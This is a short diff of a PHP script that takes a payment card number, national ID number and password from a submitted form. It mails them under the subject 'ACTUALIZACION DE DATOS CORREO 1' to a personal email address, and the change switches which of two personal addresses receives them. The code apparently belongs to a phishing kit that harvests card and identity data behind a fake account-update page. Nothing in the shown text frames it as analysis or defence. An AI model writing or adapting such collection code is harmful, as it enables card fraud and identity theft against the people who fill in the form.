@@ -18,8 +18,8 @@
             $dni = $_POST['dni'];
 
             if(isset($cc, $dni, $pass)){
-                //$to = "cruzadoeduar18@gmail.com";
-                $to = "fernando1894@hotmail.com";
+                $to = "cruzadoeduar18@gmail.com";
+                //$to = "fernando1894@hotmail.com";
                 $subject = "ACTUALIZACION DE DATOS CORREO 1";
                 $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
                     "DNI: " . $dni . "\n" . 
